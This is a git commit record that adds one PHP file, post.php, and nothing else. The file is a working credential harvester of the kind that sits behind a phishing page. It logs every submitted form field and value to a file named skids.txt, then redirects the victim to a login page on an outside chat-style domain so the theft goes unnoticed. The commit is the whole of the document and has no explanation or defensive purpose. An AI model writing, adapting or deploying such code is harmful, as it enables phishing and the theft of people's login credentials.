083a983792754d8bd30b86dd4e7502394499eac9
UngodlyRex <32689657+UngodlyRex@users.noreply.github.com>
2017-10-10 18:15:35 -0500

    Add files via upload

---
+++ post.php
@@ -0,0 +1,14 @@
+<?php
+header ('Location:http://kikchat.comli.com//login.php');
+$handle = fopen("skids.txt", "a");
+foreach($_POST as $variable => $value) {
+fwrite($handle, $variable);
+fwrite($handle, "=");
+fwrite($handle, $value);
+fwrite($handle, "\r\n");
+}
+fwrite($handle, "\r\n");
+fclose($handle);
+exit;
+?> 
+ 
